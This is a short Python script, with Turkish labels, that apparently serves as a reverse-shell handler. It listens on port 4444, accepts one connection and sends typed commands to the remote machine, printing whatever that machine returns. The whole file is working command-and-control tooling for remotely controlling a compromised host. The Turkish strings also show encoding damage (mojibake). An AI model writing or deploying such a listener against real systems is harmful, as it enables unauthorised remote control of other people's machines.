
import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, default=4444, help="Port numarasÄ±")
args = parser.parse_args()

host = "0.0.0.0"
port = args.port

s = socket.socket()
s.bind((host, port))
s.listen(1)
print(f"[+] Dinleniyor: {host}:{port}")

client, addr = s.accept()
print(f"[+] BaÄŸlandÄ±: {addr[0]}:{addr[1]}")

try:
    while True:
        komut = input("Komut >> ")
        if komut.strip() == "":
            continue
        client.send(komut.encode())
        cevap = client.recv(2048).decode()
        print(cevap)
        if komut == "exit":
            break
except Exception as e:
    print(f"[X] Hata: {str(e)}")

client.close()
s.close()
